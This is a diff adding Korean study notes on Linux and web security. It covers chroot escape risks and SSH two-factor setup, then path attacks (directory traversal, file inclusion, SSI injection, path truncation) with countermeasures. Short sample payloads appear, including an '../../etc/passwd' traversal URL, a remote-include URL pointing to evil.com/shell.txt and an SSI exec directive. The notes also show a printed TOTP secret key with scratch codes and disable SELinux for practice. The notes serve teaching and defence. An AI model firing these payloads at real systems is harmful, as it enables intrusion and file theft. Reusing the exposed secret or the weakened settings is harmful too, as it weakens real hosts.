@@ -1,0 +1,133 @@
+1. chroot를 우회하거나 악용하는 공격
+1) chroot 내부의 취약점
+ chroot는 파일 시스템을 격리하지만, 격리된 환경 내에서 파일에 대한 취약점이 여전히 존재할 수 있다. 예를 들어, chroot 환경 내에서 읽거나 쓸 수 있는 파일이 적절히 관리되지 않으면, 공격자가 파일을 변조하거나 악성 코드를 삽입할 수 있다.
+2) 권한 상승(Privilege Escalation)
+ 공격자가 chroot 환경 내에서 취약한 설정이나 소프트웨어를 발견하고 이를 악용하여 권한 상승을 시도할 수 있다. 예를 들어, chroot 내에서 관리자 권한을 얻는 방법이나 취약한 서비스나 프로그램을 찾을 수 있을 경우 이를 이용해 외부 시스템으로의 접근을 시도할 수 있다.
+3) 리소스 소비 공격 (Denial of Service, DoS)
+ 서버가 chroot 환경 내에서 과도한 리소스를 소비하게 만들어 서버의 성능을 저하시킬 수 있다. 서버가 과부하 상태가 되면 chroot 환경에서도 DoS 공격을 일으킬 수 있다.
+4) 디렉토리 탐색 공격
+ 공격자가 chroot 환경 내에서 잘못된 디렉토리 접근이나 파일 탐색을 통해 중요한 정보를 찾으려 할 수 있다. 예를 들어, 설정 파일이 잘못 설정된 경우, 이를 통해 정보를 빼낼 수 있다.
+
+2. 방어 대책
+chroot 환경 내에서 서버를 보다 안전하게 운영하려면 다음과 같은 방어 대책을 고려해야 한다:
+ 최소 권한 원칙 적용: 서버가 필요로 하는 파일과 리소스만을 chroot 환경 내에 배치해야 하며, 불필요한 파일이나 도구는 배제해야 한다.
+ 파일 권한 관리: chroot 내의 파일 권한을 신중하게 설정하여 공격자가 시스템 파일을 수정할 수 없도록 해야 한다.
+ 정기적인 보안 점검: 서버와 관련된 소프트웨어에 대한 보안 점검과 패치를 주기적으로 수행하여 취약점이 발견되었을 때 즉시 수정한다.
+ 로깅 및 모니터링: 서버와 관련된 활동을 지속적으로 모니터링하여 비정상적인 활동이나 의심스러운 트래픽을 신속히 탐지하고 대응할 수 있다.
+
+Match User user
+        ChrootDirectory /home/chroot
+        ForceCommand internal-sftp
+        #       AllowTcpForwarding no
+
+
+$ google-authenticator     (app)
+
+Your new secret key is: MTVDYOXV5PITRQHMUFNUU44YMKTFGG2L
+
+Your emergency scratch codes are:
+  15536060
+  39607123
+  76262655
+  43617705
+  19708527
+
+
+Do you want me to update your "/home/roror/.google_authenticator" file? (y/n) y
+
+Do you want to disallow multiple uses of the same authentication
+token? This restricts you to one login about every 30s, but it increases
+your chances to notice or even prevent man-in-the-middle attacks (y/n) y
+
+By default, a new token is generated every 30 seconds by the mobile app.
+In order to compensate for possible time-skew between the client and the server,
+we allow an extra token before and after the current time. This allows for a
+time skew of up to 30 seconds between authentication server and client. If you
+experience problems with poor time synchronization, you can increase the window
+from its default size of 3 permitted codes (one previous code, the current
+code, the next code) to 17 permitted codes (the 8 previous codes, the current
+code, and the 8 next codes). This will permit for a time skew of up to 4 minutes
+between client and server.
+Do you want to do so? (y/n) y
+
+If the computer that you are logging into isn't hardened against brute-force
+login attempts, you can enable rate-limiting for the authentication module.
+By default, this limits attackers to no more than 3 login attempts every 30s.
+Do you want to enable rate-limiting? (y/n) y
+
+
+# vi /etc/pam.d/sshd
+auth       required     pam_google_authenticator.so  nullok
+
+- UsePAM yes (기본 yes  참고 yes 이어야 한다.)
+# vi /etc/ssh/sshd_config
+
+# vi /etc/ssh/sshd_config.d/50-redhat.conf
+ChallengeResponseAuthentication yes
+PasswordAuthentication yes
+
+- 개별 사용자 설정시
+Match User roror
+        AuthenticationMethods “publickey”
+        Match User “*,!roror”
+        AuthenticationMethods “publickey,keyboard-interactive”
+
+# setenforce 0  로 실습한다.
+
+
+
+1) Directory Brute Force  (디렉토리 브루트포스 공격, 디렉토리 대입 공격, 디렉토리 열거 공격)
+디렉토리 이름을 무작위로 대입하여 존재하는 디렉토리를 찾아내는 공격
+대응방안 : 불필요한 디레고리 제거, WAF 적용, 접근 로그 모니터링 및 IP 차단
+
+2) Directory Traversal (디렉토리 이탈 공격, 디렉토리 횡단 공격, 디렉토리 트래버설 공격, 경로 횡단 공격)
+공격자는 파일 시스템에서 원하지 않는 디렉토리로 이동하여 중요한 파일에 액세스할 수 있다. 
+예를 들어, 공격자가 파일 경로에 "../"를 삽입하여 상위 디렉토리로 이동하여 민감한 파일에 액세스할 수 있다.
+예) https://example.com/view.php?file=../../etc/passwd
+대응방안 : 사용자 입력값 필터링 및 정규화, 화이트리스트 기반 파일 접근 제한, 웹서버 권한 최소화 설정
+
+3) Path Manipulation (경로 조작 (공격), 경로 조작 취약점, 경로 조작 및 자원 삽입)
+매니퓰레이션 공격은 경로에 대한 입력을 조작하여 애플리케이션의 동작을 변경하는 것을 목표로 한다.
+이는 디렉토리 트래버설과 유사하지만, 공격자는 상대 경로나 절대 경로를 조작하여 공격을 시도한다.
+예) getFile("../../../secret.txt")
+대응방안 : 파일 경로를 사용자 입력에 직접 의존하지 않기, 경로 필터링 및 파일 이름 검증
+참고 : 경로 조작 전반 — 상대/절대 경로 조작 포함이고 Directory Traversal은 (../) 디렉토리로 이동 하여 민감 파일 접근한다.
+          Directory Traversal(상대,절대 공격은 제외)은 Path Manipulation의 하위 유형으로 볼 수 있다, 
+
+4) Directory Listing(디렉토리 리스팅)
+웹 서버의 특정경로에 있는 파일들을 웹 서비스를 통해 디렉토리 형식으로 볼 수 있는 것을 말한다.
+예) https://example.com/uploads/
+대응방안 : Indexing 기능 비활성화 (Options -Indexes), .htaccess 설정으로 디렉토리 보호
+참고 : Directory Browsing 과 거의 동일한 의미로 사용되며, 기술적으로는 Directory Listing 기능이 켜진 상태가 Directory Browsing의 원인이다.
+
+5) Directory Browsing (디렉토리 브라우징)
+디렉토리 브라우징 공격은 웹 서버에서 발생하는 보안 취약점 중 하나로, 공격자가 서버에 있는 디렉토리와 파일을 열람하는 것이다. 
+이 공격은 보통 웹 서버가 디렉토리 색인을 활성화한 경우 또는 파일 시스템에서 특정 디렉토리에 대한 액세스 제어를 부적절하게 설정한 경우에 발생한다.
+대응방안 : 디렉토리에 index.html 파일 삽입, 웹 서버 설정에서 브라우징 기능 차단
+참고 : Index of 기능을 활성화하면 Directory Listing 상태가 되며, 사용자가 해당 경로에서 파일과 디렉토리를 보고 열람할 수 있다면 Directory Browsing 상태라 할 수 있다.
+
+6) File Inclusion (파일 포함)
+애플리케이션에서 외부 파일을 포함할 때, 공격자는 악의적인 스크립트를 삽입하여 실행할 수 있다. 이는 주로 로컬 파일 시스템이나 원격 서버의 파일을 포함하는 과정에서 발생할 수 있다.
+예) https://example.com/load.php?file=http://evil.com/shell.txt
+대응방안 : 포함할 파일을 고정된 목록으로 제한, 원격 파일 포함 비활성화 (allow_url_include = Off), 입력값 검증 및 정규화 
+
+7) Server Side Includes (SSI) Injection (SSI 삽입 공격, 서버 측 인클루드 삽입)
+서버 측 인클루드 지시문을 삽입하여 공격자는 서버 측 코드를 실행하고, 파일을 포함하여 원격 코드 실행을 시도할 수 있다.
+예) <!--#echo var="DATE_LOCAL"--> 처럼 변수나 <!--#include file="footer.html"--> 파일 삽입을  <!--#exec cmd="ls /"-->  처럼 악용
+대응방안 : SSI 기능 비활성화, 사용자 입력에 SSI 구문 포함되지 않도록 필터링
+- SSI 설정(위 설정이 없으면 SSI 지시문은 그냥 일반 텍스트로 취급)
+Options +Includes
+AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml
+
+8) Path Truncation (경로 절삭)
+애플리케이션이 경로를 고정된 길이로 자르는 경우, 공격자는 경로를 짧게 자르고 민감한 파일에 액세스할 수 있다.
+예) file=secret.php%00.jpg (널 문자 삽입)
+대응방안 : 최신 언어/라이브러리 사용, 입력값 길이 및 포맷 검증
+
+9) Predictable Path (예측 가능한 경로)
+애플리케이션에서 생성되는 경로가 예측 가능한 경우, 공격자는 예측한 경로를 사용하여 민감한 파일에 액세스할 수 있다.
+예) https://example.com/backups/backup-2025-01-01.sql
+대응방안 : 경로 및 파일명에 난수 포함, 접근 제어 및 인증 필수화
+
+
